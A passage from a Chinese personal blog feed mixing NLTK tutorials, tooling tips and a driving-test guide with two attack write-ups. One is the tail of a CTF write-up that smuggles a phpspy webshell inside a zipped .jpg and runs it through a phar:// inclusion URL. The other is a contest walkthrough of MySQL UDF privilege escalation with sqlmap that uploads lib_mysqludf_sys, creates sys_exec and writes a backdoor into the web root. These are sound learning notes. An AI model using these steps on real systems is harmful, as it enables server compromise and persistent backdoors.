<pre><code>phpspy.php-&gt;x.php-&gt;x.zip-&gt;x.jpg-&gt;upload-&gt;xsssa.jpg
</code></pre>

<p>于是构造路径并通过phar://进行访问，你猜怎么着，居然成功了，顺利得到flag：</p>

<p><a href="http://54.65.205.135/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1">http://54.65.205.135/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1</a></p>

<p>其中O6i51MF.jpg是一个zip文件，里面有一个1.php的后门。后来听说zip://这样子也可以，so?</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NLTK笔记:词干提取与词性标注]]></title>
    <link href="http://blog.ourren.com/blog/2015/03/12/nltk_note_stem_pos_tag/"/>
    <updated>2015-03-12T00:00:00-07:00</updated>
    <id>http://blog.ourren.com/blog/2015/03/12/nltk_note_stem_pos_tag</id>
    <content type="html"><![CDATA[<p>前面虽然对「nltk分句和分词」进行了分析和实现，但是在进一步进行处理之前，我们需要对这些词语进行规范化处理，例如我们需要统一所有单词的大小写，词语时态问题「相同的单词在不同的时态句型中属于不同的单词，我们需要转换为同一单词」等。nltk则针对问题提供了相关的类库，主要有两类操作：词干提取，词性标注。</p>

<h3>词干提取</h3>

<p>词干提取主要是将不同时态的词语转变为单词一般时态，例如seeing->see，extremely->extem，目前提供的类库在一定程度上可以实现这类转换「有些词语暂时不行，主要有些模块是基于字典的」。</p>

<!--more-->


<p>nltk提供三种方法可以实现如上功能：Porter、Lancaster、WordNet。使用都相当简单，具体使用方法如下：</p>

<pre><code>#! /usr/bin/env python
/# encoding: utf-8

"""
Copyright (c) 2014-2015 ourren
author: ourren &lt;i@ourren.com&gt;
"""
import nltk

def main():
    print 'enter main...'
    sentence = "Listen, strange women lying in ponds \
    distributing swords. Supreme executive power derives \
    from a mandate from the masses, not from some farcical aquatic ceremony"
    sentences = nltk.sent_tokenize(sentence)
    sentences = [nltk.word_tokenize(sent) for sent in sentences]
    for sent in sentences:
        # Porter
        porter = nltk.PorterStemmer()
        words = [porter.stem(word) for word in sent]
        print words

        # Lancaster
        lancaster = nltk.LancasterStemmer()
        lwords = [lancaster.stem(t) for t in sent]
        print lwords

        # WordNet
        wnl = nltk.WordNetLemmatizer()
        wwrods = [wnl.lemmatize(t) for t in sent]
        print wwrods

if __name__ == "__main__":
    main()
</code></pre>

<h3>词性标注</h3>

<p><a href="http://baike.baidu.com/view/377635.htm">词性</a>指作为划分词类的根据的词的特点。现代汉语的词可以分为两类12种词性。一类是实词：名词、动词、形容词、数词、量词和代词。一类是虚词：副词、介词、连词、助词、拟声词和叹词。因此nltk对应的pos_tag模块也是实现这类功能，将一个句子中的词性进行标注；</p>

<p>nltk中将词汇按它们的词性(parts-of-speec h,POS)分类以及相应的标注它们的过程被称为词性标注(part-of-speech tagging, POS tagging)或干脆简称标注。其中标注结果中缩写词所代表的词性如下：</p>

<pre><code>ADJ     adjective   new, good, high, special, big, local
ADV     adverb  really, already, still, early, now
CNJ     conjunction and, or, but, if, while, although
DET     determiner  the, a, some, most, every, no
EX      existential there, there’s
FW      foreign word    dolce, ersatz, esprit, quo, maitre
MOD     modal verb  will, can, would, may, must, should
N       noun    year, home, costs, time, education
NP      proper noun Alison, Africa, April, Washington
NUM     number  twenty-four, fourth, 1991, 14:24
PRO     pronoun he, their, her, its, my, I, us
P       preposition on, of, at, with, by, into, under
TO      the word to to
UH      interjection    ah, bang, ha, whee, hmpf, oops
V       verb    is, has, get, do, make, see, run
VD      past tense  said, took, told, made, asked
VG      present participle  making, going, playing, working
VN      past participle given, taken, begun, sung
WH      wh determiner   who, which, when, what, where, how
</code></pre>

<p>下面看具体例如：</p>

<pre><code>def sentence_pos(sentences):
    for sent in sentences:
        words = nltk.pos_tag(sent)
        print words
</code></pre>

<p>完整代码可以见<a href="https://github.com/ourren/learn_nltk">learn_nltk</a>。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Linux下MySQL Udf 提权]]></title>
    <link href="http://blog.ourren.com/blog/2015/03/10/linux_mysql_udf_shell/"/>
    <updated>2015-03-10T00:00:00-07:00</updated>
    <id>http://blog.ourren.com/blog/2015/03/10/linux_mysql_udf_shell</id>
    <content type="html"><![CDATA[<p>前几天做一个小竞赛中有一个题目：给定的测试环境登录页面有POST注入漏洞，于是果断操起sqlmap跑数据，无意中发现当前MySQL连接用户为root，于是想到udf提权「虽然Windows下MySQL提权基本上没问题，但是Linux环境下原来一直没成功过。」，最终成功获取root权限「主要问题在于MySQL是以root权限运行」，记录笔记如下，方便以后查阅：</p>

<h3>具体步骤如下</h3>

<ol>
<li><p>找到MySQL插件目录:</p>

<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell

 show variables like "%plugin%";
</code></pre></li>
<li><p>利用sqlmap上传 <a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so">lib_mysqludf_sys</a>到MySQL插件目录;</p>

<pre><code> python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys.so 
 --file-dest=/usr/lib/mysql/plugin/
</code></pre></li>
</ol>


<!--more-->


<p></p>

<ol>
<li><p>激活存储过程「sys_exec」函数:</p>

<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell

 CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so

 SELECT * FROM information_schema.routines

 sys_exec(id);
</code></pre></li>
<li><p>也利用sqlmap上传后门程序：</p>

<pre><code> python sqlmap.py -u 'http://xxx'  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php
</code></pre></li>
</ol>


<h3>测试环境</h3>

<ul>
<li>Linux Ubuntu 11.04 (Natty Narwhal)</li>
<li>PHP 5.3.5, Apache 2.2.17</li>
<li>MySQL 5.0</li>
</ul>


<h3>参考资料</h3>

<ol>
<li><a href="http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html">http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html</a></li>
<li><a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></li>
<li><a href="https://code.google.com/p/mysql-udf-http/">https://code.google.com/p/mysql-udf-http/</a></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NLTK笔记:分句与分词]]></title>
    <link href="http://blog.ourren.com/blog/2015/02/21/nltk_note_token_sentence/"/>
    <updated>2015-02-21T00:00:00-08:00</updated>
    <id>http://blog.ourren.com/blog/2015/02/21/nltk_note_token_sentence</id>
    <content type="html"><![CDATA[<p>NLTK在数据抓取完成后，你拿到的数据往往是一篇文章或者一大段文字，在进行其他处理之前，你需要先对文章进行切割或者处理(去除多余字符、特殊符号，分句和分词)，分句主要是可以把有些不需要的句子给去掉，比如长度小于10的。</p>

<h4>分句</h4>

<p>分句在nltk中没有提供相关的库来实现，但是我们可以通过python的split等函数快速完成切分任务，主要的分割特征如下：
+ 中文主要有(。？！)这几个句子结尾标志；
+ 英文也差不多(. ? !)；
使用split函数进行分割，可以得到新的列表，例如下面的函数;</p>

<!--more-->


<pre><code>def sentence_split(str_centence):
    list_ret = list()
    for s_str in str_centence.split('.'):
        if '?' in s_str:
            list_ret.extend(s_str.split('?'))
        elif '!' in s_str:
            list_ret.extend(s_str.split('!'))
        else:
            list_ret.append(s_str)
    return list_ret
</code></pre>

<h4>分词</h4>

<p>分词在NLP处理中运用得最多，但是目前针对英文分词基本上已经成熟，而针对中文的分词技术还在不断发展，对于pythoner而言，主要可以采取如下的分词方法对句子或者段落进行分词：</p>

<ul>
<li>中文：采用<a href="https://github.com/fxsjy/jieba">jieba</a>进行分词，然后再可以通过NLTK进行词频统计分析，整体而言jieba对中文分词还是可以接受；</li>
<li>英文：可以直接使用NLTK中nltk.tokenize模块进行分词；</li>
</ul>


<p>中文的分词实例可以参照这篇文章<a href="http://blog.ourren.com/?p=89252">中文分词与词频统计实例</a>,英文的分词示例如下：</p>

<pre><code>import nltk

def main():
    sentence = """At eight o'clock on Thursday morning Arthur didn't feel very good."""
    tokens = nltk.word_tokenize(sentence)
    print tokens

if __name__ == '__main__':
    main()
</code></pre>

<h4>特殊字符</h4>

<p>在处理分词或者分句中经常会除去一些特殊符号或者特殊单词，一般可能会用到的python函数：</p>

<ul>
<li>startswith</li>
<li>endswith</li>
<li>contains</li>
<li>replace</li>
<li>split</li>
<li>len</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[YouTube视频下载方法汇总]]></title>
    <link href="http://blog.ourren.com/blog/2015/02/20/youtube_video_download_summary/"/>
    <updated>2015-02-20T00:00:00-08:00</updated>
    <id>http://blog.ourren.com/blog/2015/02/20/youtube_video_download_summary</id>
    <content type="html"><![CDATA[<p>最近一直有人问我YouTube的视频怎么下载，其实在V2EX上也有很多用户讨论这个问题。本文就将这些方法汇总，方便大家查询和参考。</p>

<p>在介绍下载方法之前，首先大家需要明白的是本文针对的是YouTube上的视频，也就是说原始地址都必须是YouTube的视频链接。如果你需要下载的视频在其它网站上，那么你需要判断是否为YouTube视频并且需要找到YouTube的原始链接，其实链接也非常好找，点击播放器右下角的「YouTube」就可以打开YouTube的原始链接，有了这个原始链接就可以采用如下两种方法下载：</p>

<h4>使用下载网站</h4>

<p>「推荐」这种方法简单快捷，懒人必备，整个过程只需要点击几次：</p>

<ul>
<li>打开<a href="http://www.clipconverter.cc/">http://www.clipconverter.cc/</a>;</li>
<li>复制需要下载的原始链接到上面网页的输入框选择「continue」;</li>
<li>选择分辨率，一般果断选1080p;</li>
<li>点击「start」;</li>
<li>「download」</li>
</ul>


<!--more-->


<p>跟clipconverter类似的网站很多，列举如下：</p>

<ul>
<li><a href="http://en.savefrom.net/">http://en.savefrom.net/</a>;</li>
<li><a href="https://d.jaylab.org/">https://d.jaylab.org/</a>;</li>
<li><a href="http://kej.tw/flvretriever/">http://kej.tw/flvretriever/</a>;</li>
<li><a href="http://keepvid.com/">http://keepvid.com/</a>;</li>
</ul>


<h4>使用下载工具</h4>

<p>Windows/Linux/Mac上都有对应的下载工具，同时Firefox也有类似的插件可以下载视频；</p>

<ul>
<li><a href="https://www.4kdownload.com/">4kdownload</a>支持多平台;</li>
<li><a href="http://rg3.github.io/youtube-dl/">youtube-dl   </a>，支持多平台；</li>
<li>Firefox + video downloadhelper;</li>
</ul>


<h4>国内视频下载</h4>

<p>最后补充下国内视频「youku、tudou、ku6」等网站可以采用硕鼠进行下载：</p>

<ul>
<li><a href="http://www.flvcd.com/">硕鼠</a>，同样的使用方法，复制链接即可下载;</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NLTK笔记:简介与环境搭建]]></title>
    <link href="http://blog.ourren.com/blog/2015/02/05/nltk_note_environment_install/"/>
    <updated>2015-02-05T00:00:00-08:00</updated>
    <id>http://blog.ourren.com/blog/2015/02/05/nltk_note_environment_install</id>
    <content type="html"><![CDATA[<h3>NLP与NLTK</h3>

<p>在详细介绍nltk之前，我感觉有必要区分下NLP与NLTK的关系:</p>

<p>NLP是指自然语言处理，英文(Natural Language Processing)，该技术主要解决计算机自动识别和处理人类语言，如何让计算机能够理解我们的语言，从而减少人类的工作量。个人认为其应用场景有如下几点：</p>

<ol>
<li>个性推荐，需要计算两类物品的相识度和相关度；</li>
<li>情感分析，用户对商品的评价，网民对帖子或者文章的态度；</li>
<li>关键字提取，对网络商品的标题提取并分类，自动摘要；</li>
<li>其它，待补充；</li>
</ol>


<p>并且该相关技术最近几年热度非常高，计算机行业内研究的人也越来越多，但是不同语言的处理差异很大，比如英文的各种语言处理库基本上已经成熟，而中文的语言处理则发展缓慢；</p>

<!--more-->


<p>而NLTK是斯坦福大学开发的处理自然语言的python库，(斯坦福大学自然语言处理组是世界知名的NLP研究小组，目前course上他们的课程暂时还没看开放)，因此我们可以借助NLTK库的一些功能来处理各种事情。事实上NLTK提供的功能相当全，主要包含如下功能：</p>

<ol>
<li>语料库：提供了经典书籍，词典，演讲，网络语言，论坛等各种语料库；</li>
<li>断句与分词：可以方便地对文章，段落进行分词；</li>
<li>词频统计：计算句子或者文章中每个单词的频率；</li>
<li>同义词与词态：单词的同义词「WordNet」和单词词态「过去式，进行时等」的还原；</li>
<li>词性的标注：动词，名词，形容词和副词等的标注；</li>
<li>分类算法：例如常见的信息熵，朴素贝叶斯算法，最大信息熵模型等；</li>
<li>情感分析：当然这个其实是利用语料库和分类算法的一种应用场景；</li>
<li>其它:待补充；</li>
</ol>


<p>说了这么多，NLTK其实主要是针对英语进行处理，对中文支持不行，其它博客也有<a href="http://www.52nlp.cn/python%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E5%AE%9E%E8%B7%B5-%E5%9C%A8nltk%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E5%99%A8">改造NLTK支持中文的博文</a>，NLP和NLTK的简介基本上就扯这么多。</p>

<h3>环境搭建</h3>

<p>NLTK的安装步骤非常简单，具体参照<a href="http://www.nltk.org/install.html">官网</a>：</p>

<pre><code>#Mac/Unix
Install Setuptools: http://pypi.python.org/pypi/setuptools
Install Pip: run sudo easy_install pip
Install Numpy (optional): run sudo pip install -U numpy
Install NLTK: run sudo pip install -U nltk
Test installation: run python then type import nltk
</code></pre>

<p>需要注意的是上面只安装了nltk的主库，语料库这些都没有安装，可以通过如下的命令安装语料库，当然这些语料库也可以在需要的时候再进行安装，在python命令行中运行如下命令：</p>

<pre><code>import nltk  
nltk.download()  
</code></pre>

<p>然后会弹出下载对话框，需要你选择语料库进行下载。在这里补充说明下什么是语料库：所谓语料库就是别人或者官方收集的测试数据，而这些数据一般已经进行了特殊处理，方便你在处理各种数据的时候可以参照这些语料库进行分析，当然你也可以加入自己的语料库。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NLTK笔记:系列文章概述]]></title>
    <link href="http://blog.ourren.com/blog/2015/02/02/nltk_note_content_list/"/>
    <updated>2015-02-02T00:00:00-08:00</updated>
    <id>http://blog.ourren.com/blog/2015/02/02/nltk_note_content_list</id>
    <content type="html"><![CDATA[<p>从本系列文章中，我将最近学习自然语言处理中的NLTK库的相关技术进行分享，帮助初学者熟悉NLTK库的相关模块和功能，希望能够让你轻松地操作相关模块，完成自己的需求任务。</p>

<h3>文章目录</h3>

<p>系列文章首先会介绍NLTK的相关概念，然后介绍NLTK中比较常用的几个模块，争取每个篇文章都配上实例代码，最后用一个完整的实例进行讲解，目前暂定的目录如下：</p>

<!-- more -->


<ol>
<li>NLTK相关概念与环境搭建；</li>
<li>NLTK之分句；</li>
<li>NLTK之分词；</li>
<li>NLTK之句子分析；</li>
<li>NLTK之词性分析；</li>
<li>NLTK之词态分析；</li>
<li>NLTK之感情分析；</li>
<li>NLTK之关键字提取；</li>
<li>NLTK之分类算法；</li>
<li>&hellip;&hellip;</li>
</ol>


<p>暂时只考虑到以上的几个部分，以后有特别需要的部分再继续补上，其中本系列文章的技术主要参考两本书籍：</p>

<ol>
<li><a href="http://www.nltk.org/book/">Natural Language Processing With Python</a></li>
<li><a href="http://vdisk.weibo.com/s/qdxg3WEhv6A2">Machine Learning for Hackers</a></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[美化Ubuntu下Pycharm字体]]></title>
    <link href="http://blog.ourren.com/blog/2015/01/31/ubuntu_beauty_fonts_with_pycharm/"/>
    <updated>2015-01-31T00:00:00-08:00</updated>
    <id>http://blog.ourren.com/blog/2015/01/31/ubuntu_beauty_fonts_with_pycharm</id>
    <content type="html"><![CDATA[<h3>美化Ubuntu下pycharm的字体</h3>

<p>Pycharm作为一款优秀的Python IDE，现在更有免费的社区版可供下载，不得不说对于pyer方便不少，随便Sublime Text确实可以在一定程度上解决问题，但是Pycharm的调试和集成工具绝对是提交效率的好帮手。然而Pycharm安装在Ubuntu下时界面和字体的显示效果极差，跟Mac的效果简直没办法比，因此Google了一番找到了完美的解决方案，特此分享。</p>

<h3>解决方案</h3>

<p>Pycharm 字体渲染技术差的原因貌似主要是openjdk的问题，因此Linux下通过infinality fontconfig和openjdk patch来解决相关问题，在国外博客和V2ex上其实已经有详细说明：</p>

<!--more-->


<ol>
<li><a href="http://www.webupd8.org/2013/06/install-openjdk-patched-with-font-fixes.html">INSTALL OPENJDK PATCHED WITH FONT FIXES</a>；</li>
<li><a href="http://www.webupd8.org/2013/06/better-font-rendering-in-linux-with.html">BETTER FONT RENDERING IN LINUX WITH INFINALITY</a></li>
<li><a href="http://www.v2ex.com/t/88662">Linux中PyCharm渲染字体</a></li>
</ol>


<h3>安装步骤</h3>

<p>需要安装两个软件包进行设置，具体操作如下</p>

<ol>
<li><p>安装Infinality</p>

<pre><code> sudo add-apt-repository ppa:no1wantdthisname/ppa
 sudo apt-get update
 sudo apt-get upgrade
 sudo apt-get install fontconfig-infinality
</code></pre></li>
<li><p>安装openjdk-fontfix</p>

<pre><code> sudo add-apt-repository ppa:no1wantdthisname/openjdk-fontfix
 sudo apt-get update
 sudo apt-get upgrade
</code></pre></li>
<li>安装完成</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[安全界的顶级会议]]></title>
    <link href="http://blog.ourren.com/blog/2015/01/20/top_security_conference/"/>
    <updated>2015-01-20T00:00:00-08:00</updated>
    <id>http://blog.ourren.com/blog/2015/01/20/top_security_conference</id>
    <content type="html"><![CDATA[<p>可能很多人(特别是国内的，咳咳)跟我一样读了很多年书，虽然从事的是安全领域的研究，但是国际上顶级的安全会议可能都不知道，我也是最近才研究了一下国际上的安全顶级会议和论文下载方法。</p>

<h4>四大顶会</h4>

<p>安全界有四大著名顶级会议，简称：S&amp;P、CCS、Security、NDSS；其实有两个网页对安全类会议进行了排名，详细排名大家可以参考「1、2」。但是貌似从事安全研究的人员只认这四个会议，导致这四个会议论文的通过率非常低，因此我们只要关注这四个会议的文章就大概知道国际上安全人员在研究些啥东西了；</p>

<!--more-->


<ol>
<li><p>S&amp;P</p>

<p> 从<a href="http://www.ieee-security.org/TC/SP-Index.html">S&amp;P</a>的官方上看，你会发现其实S&amp;P每年不只一个会议，S&amp;P又分为两类：SP Conference Information、SP Workshops Information。第一类「SPC」大家一看英文应该就知道含义吧，第二类可以看2014年<a href="http://www.ieee-security.org/TC/SPW2014/index.html">官网</a>的一个介绍：</p>

<blockquote><p>Overview:
Since 1980, the IEEE Symposium on Security and Privacy (SP) has been the premier forum for the presentation of developments in computer security and electronic privacy, and for bringing together researchers and practitioners in the field.</p>

<p>In order to further expand the opportunities for scientific exchanges, we created a new venue within the IEEE CS Technical Committee on Security and Privacy called Security and Privacy Workshops (SPW). The typical purpose of such a workshop is to cover a specific aspect of security and privacy in more detail, making it easy for the participants to attend IEEE SP and a specialized workshop at IEEE SPW with just one trip. Furthermore, the co-location offers synergies for the organizers. The workshops are co-located with the IEEE Security and Privacy Symposium, and the number of workshops and attendees have grown steadily during recent years. Workshops can be annual events (e.g. W2SP), one time events, or aperiodic.</p></blockquote>

<p>  说了这么多的意思就是「SPW」是为了增加投论文的机会，毕竟「SP」每年也收录不到太多的论文，并且这个「SPW」所囊括的会议也越来越多，就2014年貌似有就有<a href="http://www.ieee-security.org/TC/SPW2014/index.html">7个会议</a>；</p>

<p>  这个会议的演讲论文在<a href="http://www.ieee-security.org/TC/SP-Index.html">主页</a>以及每个会议的<a href="http://www.ieee-security.org/TC/SPW2014/index.html">首页</a>(需要点击进入每个会议网页哈)都有下载，另外你要是你拥有IEEE论文数据库，可以通过<a href="http://ieeexplore.ieee.org/xpl/conferences.jsp">IEEE的会议搜索</a>进行会议搜索，比如：<a href="http://ieeexplore.ieee.org/xpl/mostRecentIssue.jsp?punumber=6954656">Security and Privacy (SP), 2014 IEEE Symposium on</a>、<a href="http://ieeexplore.ieee.org/xpl/mostRecentIssue.jsp?punumber=6954698">Security and Privacy Workshops (SPW), 2014 IEEE</a>。</p></li>
<li><p>CCS</p>

<p> CCS的全称为：<a href="http://www.sigsac.org/ccs.html">ACM Conference on Computer and Communications Security</a>, 看介绍也是开始于1993，还是挺久远的一个会议。</p>

<p> 会议的论文可以通过网站的链接看到<a href="http://dl.acm.org/event.cfm?id=RE182&amp;tab=pubs&amp;CFID=619951631&amp;CFTOKEN=27784456">历年的论文记录</a>,当然这个论文库是在acm数据库中，你没有这个论文库的话果断Google吧，或者使用<a href="http://www.informatik.uni-trier.de/~ley/db/">dblp数据库</a>进行搜索，一般都可以搜到PDF，主要还是源于计算机和安全领域大家都还是乐于分享。2014年CCS的所有论文可以通过<a href="http://dl.acm.org/citation.cfm?id=2666652&amp;CFID=619951631&amp;CFTOKEN=27784456">Proceedings of the 2014 Workshop on Artificial Intelligent and Security Workshop</a>进行下载。</p></li>
<li><p>USENIX Security</p>

<p> 终于该介绍USENIX Security了，其实本人最开始接触的就是这个会议，因此这个会议的论文集居然有epub和mobi格式，不得不说科技很强大。USENIX最开始其实是UNIX，但是由于商标问题后来改为USENIX，具体过程可以参见<a href="http://zh.wikipedia.org/wiki/USENIX">维基百科USENIX</a>。USENIX 其实是一个计算机类会议的总称，详细会议列表可以看<a href="https://www.usenix.org/conferences">这里</a>，而USENIX Security只是USENIX中的安全会议，并且USENIX Security会议涵盖的安全领域也非常多，包含：二进制安全、固件安全、取证分析、Web安全、隐私保护、恶意分析等。</p>

<p> 会议的论文直接在<a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions">官网</a>提供下载，也有很多格式(PDF、EPUB、MOBI)。</p></li>
<li><p>NDSS</p>

<p> <a href="http://www.internetsociety.org/events/ndss-symposium">NDSS</a>的全称为(Network and Distributed System Security)，其官网中也提供了<a href="http://www.internetsociety.org/events/ndss-symposium/previous-conferences">历届会议列表</a>。
 NDSS2014年的论文集可以通过这里进行<a href="http://pan.baidu.com/wap/link?uk=1812237392&amp;shareid=3622732641&amp;third=0">下载</a>。</p></li>
</ol>


<h4>参考链接</h4>

<ol>
<li><a href="http://faculty.cs.tamu.edu/guofei/sec_conf_stat.htm">Computer Security Conference Ranking and Statistic</a></li>
<li><a href="http://icsd.i2r.a-star.edu.sg/staff/jianying/conference-ranking.html">Top Crypto and Security Conferences Ranking (2014)</a></li>
<li></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[解决composer的ssl证书问题]]></title>
    <link href="http://blog.ourren.com/blog/2015/01/18/solve_composer_ssl_error/"/>
    <updated>2015-01-18T00:00:00-08:00</updated>
    <id>http://blog.ourren.com/blog/2015/01/18/solve_composer_ssl_error</id>
    <content type="html"><![CDATA[<p>作为PHP深度开发者，<a href="https://getcomposer.org/">composer</a>的出现可以说解决了大家的环境配置成本、代码共享方式和代码更新问题，现在的大部分的PHP框架如<a href="http://laravel.com/">laravel</a>、<a href="http://www.yiiframework.com/">yii2</a> 都采用composer的包管理机制，可以让开发者快速安装插件。</p>

<p>最近遇到的主要问题是执行composer更新命令遇到如下错误：</p>

<pre><code>composer self-update

[Composer\Downloader\TransportException]
The "https://getcomposer.org/version" file could not be downloaded: SSL operation failed with code 1. OpenSSL Error messages:error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed
Failed to enable crypto
failed to open stream: operation failed
</code></pre>

<!--more-->


<p>其实你要是把这个错误信息放在网上<a href="https://www.google.com/search?q=mac+The+%22https%3A%2F%2Fpackagist.org%2Fpackages.json%22+file+could+not+be+downloaded%3A+SSL+operation+failed+with+code+1.+OpenSSL+Error+messages%3A&amp;oq=mac+The+%22https%3A%2F%2Fpackagist.org%2Fpackages.json%22+file+could+not+be+downloaded%3A+SSL+operation+failed+with+code+1.+OpenSSL+Error+messages%3A">一搜</a>，结果发现一堆这种问题，但是问题的关键是这些问题都没有给出解决方案，比较靠谱的回答有如下几种：</p>

<ol>
<li>证书出现问题，去更新下你的证书信息；</li>
<li>网络问题，自己看下是不是被欺骗了；</li>
<li>&hellip;&hellip;.</li>
</ol>


<p>Google出来很多答案，就连stackoverflow都有很多问题和答案，但是问题的关键这些答案都不能解决问题，通过自己的研究发现目前Mac安装的PHP版本是5.3版本的，感觉应该是openssl爆出漏洞后导致证书不可信，所以直接升级PHP版本应该就可以，那就可以直接执行如下命令：</p>

<pre><code>brew install php56
</code></pre>

<p>请注意，make的时候cpu飙到99%是正常的，稍微等几分钟就好了，然后执行更新：</p>

<pre><code>composer update

Your requirements could not be resolved to an installable set of packages.
</code></pre>

<p>这个问题就更好解决了，修改当前工程的composer.json中的：</p>

<pre><code>"minimum-stability": "stable",
</code></pre>

<p>改为：</p>

<pre><code>"minimum-stability": "dev",
"prefer-stable": true,
</code></pre>

<p>顺利解决问题～</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[加州驾照考试全攻略]]></title>
    <link href="http://blog.ourren.com/blog/2015/01/17/driver_lisence_in_ca/"/>
    <updated>2015-01-17T00:00:00-08:00</updated>
    <id>http://blog.ourren.com/blog/2015/01/17/driver_lisence_in_ca</id>
    <content type="html"><![CDATA[<p>相比国内科目复杂，收费昂贵的驾照考试，生活在美帝的人民可以说是幸福的，因此他们可以快速地拿到驾照。加州驾照考试主要分为两部分：笔试＋路考(1次)，收费31刀。其它州考试应该也差不多，但是加州笔试有中文试卷，这是其它州貌似没有的优势。以下是驾照学习资料和考试过程，方便需要的小伙伴。</p>

<h4>笔试参考资料</h4>

<p>其实驾照笔试考试应该国内外都差不多，仔细阅读自动车手册，并找一些真题或者模拟题来做，以下是收集到的参考资料：</p>

<ol>
<li><a href="http://apps.dmv.ca.gov/pubs/foreign_hdbk/dl600C.pdf">加州DMV中文手册</a>：此文本详细描写了驾驶员需要遵守的规则及详细讲解，可以花一个小时详细阅读下，特别提醒(加州目前的笔试加了一些新题目，因此不能仅仅参照原来的真题答案，还是仔细阅读下手册)；</li>
<li><a href="http://www.ccyp.com/TRAFFIC/">华人工商－加州驾照模拟题</a>: 题目挺全的，基本上囊括了历年的真题和手册上的知识，但是目前有些新的题型这上面确实还没有；</li>
<li><a href="http://www.moonbbs.com/forum.php?mod=viewthread&amp;tid=120418&amp;page=1">历年真题</a>: 这个帖子前面部分其实就是华人工商的题，推荐直接看上面的，后面有真题部分；</li>
</ol>


<!--more-->


<h4>笔试携带文件</h4>

<p>复习好笔试相关知识后就需要预约笔试，有两种方法：</p>

<ol>
<li>网站上进行预约。打开<a href="http://dmv.ca.gov">DMV OFFICIAL PAGE</a>，在ONLINE SERVICES 这个目录下找到Appointment，选择OFFICE VISIT APPOINTMENT, 选择离你最近的DMV，然后选择APPLY FOR CALIFORNIA DRIVER&rsquo;S LICENSE，填写自己的个人信息 选择日期(DMV一般都十分繁忙，Appointment 一般都需要提前10-15天）。</li>
<li>直接奔赴DMV考场。可以不用预约，直接去DMV排队，一般排队在半个小时到一个小时；</li>
</ol>


<p>去DMV考试时需要携带一些必要资料，中国国籍满18的留学生或者访问学者你需要携带如下资料：</p>

<ol>
<li>护照；</li>
<li>I-20/DS-2019;</li>
<li>I-94复印件，直接去<a href="https://i94.cbp.dhs.gov">dhs</a>上面打印；</li>
<li>中国国籍16 &lt;your age&lt;18 除了上面那些东西，还需要你的监护人到场;</li>
</ol>


<h4>笔试考试步骤</h4>

<p>去DMV后有一定的操作步骤，详细描述如下：</p>

<ol>
<li>到了柜台之后排队，工作人员会要你填写一份表格，涉及了各种基本资料, (PS 如果你在国内有驾照的话，建议带上，后面会解释为什么。）然后后面有一个问题就是：你愿不愿意捐献你自己的器官啊什么的如果你发生了任何意外&hellip;看自己选择，如果想挂了保个全尸的话，就果断选择给美帝贡献两块钱(这个选项不会对后面产生任何影响）还有提问你是否想参加选举，如果你不是美国citizen的话就不需要填写了。</li>
<li>写完这一个表之后，交给工作人员，她会给你一个排号，等待被叫号;</li>
<li>听到叫号后，前往指定柜台。在柜台处会要求测视力，建议近视不深的童鞋们先别带眼镜，不然如果戴眼镜测试的话，以后你开车都会被要求戴眼镜。然后需要录入指纹，最后在这个柜台需要交31块钱，如果你刚刚选择了给美帝国主义捐献2块钱的话，也需要在这里交（注意DMV只接受DEBIT CARD，CHECK和CASH，是不接受CREDIT的）交完钱之后，他会给你一张纸条, 注意这里他会问你是否需要中文试卷；</li>
<li>就要前往照相和签名了。前去排队照相，注意你照相只有一次机会，而且相片会被用在驾照上, 然后需要签名，这个签名也是用在驾照上的，一定要好好签，不同的是签名可以签多次，不满意就选择clear，重新签就好了，然后他会给你试卷。</li>
<li>然后就可以开始考啦，一般没有时间限制. 但是也没有必要花太多时间。请注意DMV 4.30之后就不会再给考试了 因为他们5点就下班.（PS 第一次申请驾照的人有6题的容错率，而换驾照的就只有3次了）。</li>
<li>做完之后拿到跟照相的同一个窗口，会有工作人员帮你改题目，如果通过了，立刻就可以拿到一张permit了，有了permit你就可以上路了，不过需要一位超过18且有正式驾照的人陪你开。PS 刚刚提到有国内驾照的童鞋，你们拿到的会是一张temporary driving license，是可以独自上路的，而不需要有人陪同，这是最大的不同~</li>
</ol>


<h4>路考参考资料</h4>

<p>一些路考参考资料汇总：</p>

<ol>
<li><a href="https://www.youtube.com/playlist?list=PL297E87DA9A1025B2">CA DMV-Top 10 Reasons for Failing the Driving Test</a>： 官方的驾驶常见错误；</li>
<li><a href="http://www.tudou.com/programs/view/bPTcTyUDQyQ/">美国驾照路考</a>：热心小伙伴的详细讲解。</li>
<li><a href="https://www.youtube.com/watch?v=2kQXaC96bUU&amp;index=2&amp;list=FLuBaD6f8UL8es7JvFL_-T8w">An Actual California DMV Drive Test, Part 1 of 2</a>;</li>
